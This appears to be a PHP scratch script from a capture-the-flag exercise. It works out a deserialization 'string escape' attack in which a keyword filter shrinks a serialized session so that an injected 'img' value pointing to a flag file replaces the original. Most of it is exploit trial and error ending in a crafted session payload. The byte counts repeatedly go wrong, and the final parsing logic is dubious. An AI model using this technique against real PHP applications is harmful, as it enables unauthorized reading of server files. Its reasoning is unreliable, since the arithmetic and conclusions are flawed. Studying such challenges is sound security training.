<?php
// Let me simplify and test the core concept

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// The key insight: we need to use the escape to inject a new img value
// 
// The trick is to use MULTIPLE keywords to generate enough overflow
// to consume the remaining original structure

// Let's try a different approach:
// Instead of injecting from the 'user' field, let's inject from the 'function' field!

// The original structure:
// a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"BASE64";}
// 
// If we set function = 'flag' + injection:
// 
// Serialized: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:45:"flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// After filter: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// a:3:{ - array with 3 elements
// s:4:"user" - key 1
// s:5:"guest" - value 1
// s:8:"function" - key 2
// s:45:" - value 2
//   PHP reads 45 bytes from ""
//   Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   
//   PHP reads 45 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"im (45 bytes)
//   
//   Then PHP expects "; (closing quote and semicolon)
//   Next char: g (from "img")
//   Expected ", got g
//   Error!

// Still doesn't work!

// Let me try yet another approach:
// What if we use the escape to inject content that includes the array closing brace?
// 
// The key insight: we want to close the array early with our injected img!

// Let me think about the structure:
// a:3:{user;function;img;}
// 
// If we can inject: user;function;img;}
// where img is our injected value, and } closes the array,
// then the original img would be ignored!

// But the array count is 3, so we need exactly 3 elements!

// Let me try:
// user = 'flag' + '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// After filter: '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// This is 66 bytes.
// 
// Serialized: s:70:"flag";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:70:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 70 bytes from ""
// Content: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// That's 66 + 73 = 139 bytes.
// 
// PHP reads 70 bytes: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"fu (70 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: n (from "nction")
// Expected ", got n
// Error!

// I keep getting the same error!

// Let me try a completely different approach:
// What if we use the 'img' key itself?
// 
// The filter removes 'php', 'flag', 'php5', 'php4', 'fl1g'.
// 
// What if we set img_path to something that contains these keywords?
// 
// Actually, img_path gets sha1'd, so we can't control the final img value.

// Let me think about this more carefully.
// 
// The key insight: the filter SHRINKS the string.
// When PHP reads N bytes from a shorter string, it reads past the closing quote.
// 
// After reading N bytes, PHP expects "; (closing quote and semicolon).
// 
// If we can make the content after N bytes be ";, PHP will continue parsing!
// 
// The trick is to find the right N such that the (N+1)th byte is "!

// Let me calculate for the function field:
// 
// function = 'flag' + injection
// injection = ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// injection length: 41 bytes
// 
// Serialized: s:45:"flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 45 bytes from ""
// Content after "": ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Let me find positions where " appears in this content:
// Position 0: "
// Position 1: ;
// Position 2: s
// Position 3: :
// Position 4: 3
// Position 5: :
// Position 6: "
// Position 7: i
// Position 8: m
// Position 9: g
// Position 10: "
// Position 11: ;
// Position 12: s
// Position 13: :
// Position 14: 2
// Position 15: 0
// Position 16: :
// Position 17: "
// Position 18: Z
// ...
// Position 37: "
// Position 38: ;
// Position 39: }
// Position 40: "
// Position 41: ;
// Position 42: s
// Position 43: :
// Position 44: 3
// Position 45: :
// Position 46: "
// ...
// 
// So " appears at positions 0, 6, 10, 17, 37, 40, 46, ...
// 
// If we make N = 39, then the (N+1)th byte (position 40) is "!
// 
// PHP reads 39 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} (39 bytes, missing the last ")
// 
// Wait, let me count: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// " = 1
// ; = 1
// s = 1
// : = 1
// 3 = 1
// : = 1
// " = 1
// i = 1
// m = 1
// g = 1
// " = 1
// ; = 1
// s = 1
// : = 1
// 2 = 1
// 0 = 1
// : = 1
// " = 1
// Z = 1
// D = 1
// B = 1
// n = 1
// M = 1
// 1 = 1
// 9 = 1
// m = 1
// M = 1
// W = 1
// F = 1
// n = 1
// L = 1
// n = 1
// B = 1
// o = 1
// c = 1
// A = 1
// = = 1
// = = 1
// " = 1
// ; = 1
// } = 1
// Total: 40 bytes

// So the injection is 40 bytes, not 41!
// 
// If we make N = 39, PHP reads 39 bytes from the 40-byte injection.
// PHP reads: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} (missing the last })
// 
// Wait, that's 39 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="; (missing the last };)
// 
// Hmm, let me recount:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// First 39 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="; (missing the last };)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: } (from the injection)
// Expected ", got }
// Error!

// The 39th byte is: " (from the last ";)
// And the next char is: ; (from ";)
// 
// Wait, let me trace through more carefully.
// 
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// Position 0: "
// Position 1: ;
// ...
// Position 37: "
// Position 38: ;
// Position 39: }
// 
// So position 39 is: }
// 
// If PHP reads 39 bytes (positions 0-38), the content is:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="; (missing the last })
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: } (position 39)
// Expected ", got }
// Error!

// If PHP reads 40 bytes (positions 0-39), the content is:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: " (from the next field ";s:3:...)
// PHP reads: " (closing quote)
// Next char: ;
// PHP reads: ; (semicolon)
// 
// PHP found "; and continues parsing!
// 
// The next chars are: s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// PHP parses this as the remaining elements!

// So we need N = 40!

// Let me test:
// function = 'flag' + injection = 4 + 40 = 44 bytes
// 
// But wait, the injection is 40 bytes, so function = 'flag' + injection = 44 bytes.
// 
// After filter: injection = 40 bytes
// 
// Serialized: s:44:"flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:44:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 44 bytes from ""
// Content after "": ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// That's 40 + 33 = 73 bytes.
// 
// PHP reads 44 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"im (44 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: g (from "img")
// Expected ", got g
// Error!

// Still doesn't work!

// The issue is that we need 4 more bytes to reach the next "!

// Let me try with more 'flag's:
// function = 'flag' * 2 + injection = 8 + 40 = 48 bytes
// 
// After filter: injection = 40 bytes
// 
// Serialized: s:48:"flagflag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:48:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 48 bytes from ""
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP reads 48 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img"; (48 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: s (from "s:20:...")
// Expected ", got s
// Error!

// Let me try with more 'flag's:
// function = 'flag' * 3 + injection = 12 + 40 = 52 bytes
// 
// After filter: injection = 40 bytes
// 
// PHP reads 52 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20 (52 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: " (from "Z3Vlc3Rf...")
// PHP reads: " (closing quote)
// Next char: ;
// PHP reads: ; (semicolon)
// 
// PHP found "; and continues parsing!
// 
// The next chars are: Z3Vlc3RfaW1nLnBuZw==";}
// PHP parses this as the remaining content!

// So we need 3 'flag's!

// Let me test this:
$_SESSION = [];
$_SESSION['user'] = 'guest';
$_SESSION['function'] = 'flagflagflag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);
echo "\n";

